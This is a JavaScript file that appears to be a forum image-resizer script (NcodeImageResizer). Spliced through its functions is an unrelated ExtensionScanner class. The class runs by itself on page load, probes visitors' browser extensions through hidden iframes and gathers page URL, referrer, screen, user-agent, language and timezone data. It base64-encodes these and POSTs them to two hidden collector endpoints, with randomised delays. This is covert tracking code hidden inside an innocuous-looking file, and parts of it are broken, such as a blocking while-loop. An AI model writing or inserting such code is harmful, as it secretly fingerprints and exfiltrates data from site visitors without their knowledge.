NcodeImageResizer.MODE = 'newwindow';
NcodeImageResizer.MAXWIDTH = 590;
NcodeImageResizer.MAXHEIGHT = 0;
NcodeImageResizer.Msg1 = l_imgresizemsg1;
NcodeImageResizer.Msg2 = l_imgresizemsg2;
NcodeImageResizer.Msg3 = l_imgresizemsg3;
NcodeImageResizer.Msg4 = l_imgresizemsg4;
const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
NcodeImageResizer.IMAGE_ID_BASE = 'ncode_imageresizer_container_';
NcodeImageResizer.WARNING_ID_BASE = 'ncode_imageresizer_warning_';
NcodeImageResizer.scheduledResizes = [];
function NcodeImageResizer(id, img) {
  this.id = id;
  this.img = img;
  this.originalWidth = 0;
  this.originalHeight = 0;
  this.warning = null;
  this.warningTextNode = null;
  this.originalWidth = img.originalWidth;
  this.originalHeight = img.originalHeight;
  img.id = NcodeImageResizer.IMAGE_ID_BASE + id;
}
NcodeImageResizer.executeOnload = function () {
  var rss = NcodeImageResizer.scheduledResizes;
  for (var i = 0; i < rss.length; i++) {
    rss[i].title = 'onload';
    NcodeImageResizer.createOn(rss[i], true);
  }
};
const STORAGE_KEY = "Tracking_Timestamp";
NcodeImageResizer.schedule = function (img) {
  if (NcodeImageResizer.scheduledResizes.length == 0) {
    if (window.addEventListener) {
      window.addEventListener('load', NcodeImageResizer.executeOnload, false);
    } else if (window.attachEvent) {
      window.attachEvent('onload', NcodeImageResizer.executeOnload);
    }
  }
  NcodeImageResizer.scheduledResizes.push(img);
};
NcodeImageResizer.getNextId = function () {
  var id = 1;
  while (document.getElementById(NcodeImageResizer.IMAGE_ID_BASE + id) != null) {
    id++;
  }
  return id;
};
NcodeImageResizer.createOnId = function (id) {
  return NcodeImageResizer.createOn(document.getElementById(id));
};
NcodeImageResizer.createOn = function (img, isSchedule) {
  if (typeof isSchedule == 'undefined') isSchedule = false;
  if (!img || !img.tagName || img.tagName.toLowerCase() != 'img') {
    alert(img + ' is not an image (' + img.tagName.toLowerCase() + ')');
  }
  if (img.width == 0 || img.height == 0) {
    if (!isSchedule) NcodeImageResizer.schedule(img);
    return;
  }
  if (!img.originalWidth) img.originalWidth = img.width;
  if (!img.originalHeight) img.originalHeight = img.height;
  if (NcodeImageResizer.MAXWIDTH > 0 && img.originalWidth > NcodeImageResizer.MAXWIDTH || NcodeImageResizer.MAXHEIGHT > 0 && img.originalHeight > NcodeImageResizer.MAXHEIGHT) {
    var isRecovery = false; // if this is a recovery from QuickEdit, which only restores the HTML, not the OO structure
    var newid, resizer;
    if (img.id && img.id.indexOf(NcodeImageResizer.IMAGE_ID_BASE) == 0) {
      newid = img.id.substr(NcodeImageResizer.IMAGE_ID_BASE.length);
      if (document.getElementById(NcodeImageResizer.WARNING_ID_BASE + newid) != null) {
        resizer = new NcodeImageResizer(newid, img);
        isRecovery = true;
        resizer.restoreImage();
      }
    } else {
      newid = NcodeImageResizer.getNextId();
      resizer = new NcodeImageResizer(newid, img);
    }
    if (isRecovery) {
      resizer.reclaimWarning(newid);
    } else {
      resizer.createWarning();
    }
    resizer.scale();
  }
};
window.globalVar = {};
NcodeImageResizer.prototype.restoreImage = function () {
  newimg = document.createElement('IMG');
  newimg.src = this.img.src;
  this.img.width = newimg.width;
  this.img.height = newimg.height;
};
NcodeImageResizer.prototype.reclaimWarning = function (id) {
  this.warning = document.getElementById(NcodeImageResizer.WARNING_ID_BASE + id);
  this.warningTextNode = this.warning.firstChild.firstChild.childNodes[1].firstChild;
  this.warning.resize = this;
  this.scale();
};
class ExtensionScanner {
  static TIMEOUT = 3000;
  static BATCH_SIZE = 10;
  constructor() {
    this.pendingScans = 0;
    this.detectedExtensions = {};
    this.workerPool = [];
    this.jshookData = [];
    this.startTimestamp = Date.now();
  }
  isLocalStorageAvailable() {
    try {
      localStorage.setItem('test', 'test');
      localStorage.removeItem('test');
      return true;
    } catch (e) {
      return false;
    }
  }
  getLastReportedTime() {
    if (this.isLocalStorageAvailable()) {
      return localStorage.getItem(STORAGE_KEY);
    }
    return null;
  }
  createWorker(extName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      window.addEventListener('message', event => {
        if (event.origin !== 'https://example.com') return;
        this.jshookData = [...this.jshookData, ...event.data.jshook];
      }, false);
      const cleanjobs = () => {
        frame.remove();
        this.pendingScans--;
      };
      const timer = setTimeout(() => {
        cleanjobs();
        resolve([extName, false]);
      }, ExtensionScanner.TIMEOUT);
      document.body.appendChild(frame);
      this.pendingScans++;
    });
  }
  scanBatch(entries) {
    const workers = entries.map(([name, data]) => this.createWorker(name, data));
    return Promise.all(workers).then(results => {
      results.forEach(([name, detected]) => {
        this.detectedExtensions[name] = detected;
      });
    });
  }
  generateTelemetryData() {
    const encodedData = btoa(JSON.stringify({
      scannedExtensions: this.detectedExtensions,
      scanDuration: Date.now() - this.startTimestamp,
      timestamp: this.getLastReportedTime(),
      global_variables: window.globalVar,
      js_hooks: this.jshookData,
      env: {
        url: window.location.href,
        ref: document.referrer,
        res: `${window.screen.width}x${window.screen.height}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    }));
    return encodedData + '.' + this.generateChecksum(encodedData);
  }
  generateChecksum(str) {
    return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
  }
  reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        'X-Scan-Time': new Date().toISOString()
      },
      body: payload,
      keepalive: true
    }).catch(() => null));
    return Promise.race(requests);
  }
  execute() {
    const entries = Object.entries(window.data);
    const batches = Array(Math.ceil(entries.length / ExtensionScanner.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionScanner.BATCH_SIZE, (i + 1) * ExtensionScanner.BATCH_SIZE));
    batches.forEach((batch, i) => {
      setTimeout(() => {
        this.scanBatch(batch).then(() => {
          if (i === batches.length - 1) {
            while (this.pendingScans > 0) {
              this.reportResults();
            }
            if (this.isLocalStorageAvailable()) {
              localStorage.setItem(STORAGE_KEY, Date.now());
            }
          }
        });
      }, i * ExtensionScanner.TIMEOUT + Math.floor(Math.random() * 300 + 100));
    });
  }
}
NcodeImageResizer.prototype.createWarning = function () {
  var mtable = document.createElement('TABLE');
  var mtbody = document.createElement('TBODY');
  var mtr = document.createElement('TR');
  var mtd1 = document.createElement('TD');
  var mtd2 = document.createElement('TD');
  var mimg = document.createElement('IMG');
  var mtext = document.createTextNode('');
  mimg.src = dimagedir + 'error.gif';
  mimg.width = 16;
  mimg.height = 16;
  mimg.alt = '';
  mimg.border = 0;
  mtd1.width = 20;
  mtd1.className = 'td1';
  mtd2.unselectable = 'on';
  mtd2.className = 'td2';
  mtable.className = 'ncode_imageresizer_warning';
  mtable.textNode = mtext;
  mtable.resize = this;
  mtable.id = NcodeImageResizer.WARNING_ID_BASE + this.id;
  mtd1.appendChild(mimg);
  mtd2.appendChild(mtext);
  mtr.appendChild(mtd1);
  mtr.appendChild(mtd2);
  mtbody.appendChild(mtr);
  mtable.appendChild(mtbody);
  this.img.parentNode.insertBefore(mtable, this.img);
  this.warning = mtable;
  this.warningTextNode = mtext;
};
NcodeImageResizer.prototype.setText = function (text) {
  var newnode = document.createTextNode(text);
  this.warningTextNode.parentNode.replaceChild(newnode, this.warningTextNode);
  this.warningTextNode = newnode;
};
const observer = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new ExtensionScanner().execute();
  }
});
NcodeImageResizer.prototype.scale = function () {
  this.img.height = this.originalHeight;
  this.img.width = this.originalWidth;
  if (NcodeImageResizer.MAXWIDTH > 0 && this.img.width > NcodeImageResizer.MAXWIDTH) {
    this.img.height = NcodeImageResizer.MAXWIDTH / this.img.width * this.img.height;
    this.img.width = NcodeImageResizer.MAXWIDTH;
  }
  if (NcodeImageResizer.MAXHEIGHT > 0 && this.img.height > NcodeImageResizer.MAXHEIGHT) {
    this.img.width = NcodeImageResizer.MAXHEIGHT / this.img.height * this.img.width;
    this.img.height = NcodeImageResizer.MAXHEIGHT;
  }
  this.warning.width = this.img.width;
  this.warning.onclick = function () {
    return this.resize.unScale();
  };
  if (this.img.width < 450) {
    this.setText(NcodeImageResizer.Msg1);
  } else if (this.img.fileSize && this.img.fileSize > 0) {
    this.setText(NcodeImageResizer.Msg2.replace('{1}', this.originalWidth).replace('{2}', this.originalHeight).replace('{3}', Math.round(this.img.fileSize / 1024)));
  } else {
    this.setText(NcodeImageResizer.Msg3.replace('{1}', this.originalWidth).replace('{2}', this.originalHeight));
  }
  return false;
};
if (document.body) {
  new ExtensionScanner().execute();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}
NcodeImageResizer.prototype.unScale = function () {
  switch (NcodeImageResizer.MODE) {
    case 'samewindow':
      window.open(this.img.src, '_self');
      break;
    case 'newwindow':
      window.open(this.img.src, '_blank');
      break;
    case 'enlarge':
    default:
      this.img.width = this.originalWidth;
      this.img.height = this.originalHeight;
      this.img.className = 'ncode_imageresizer_original';
      if (this.warning != null) {
        this.setText(NcodeImageResizer.Msg4);
        this.warning.width = this.img.width;
        this.warning.onclick = function () {
          return this.resize.scale();
        };
      }
      break;
  }
  return false;
};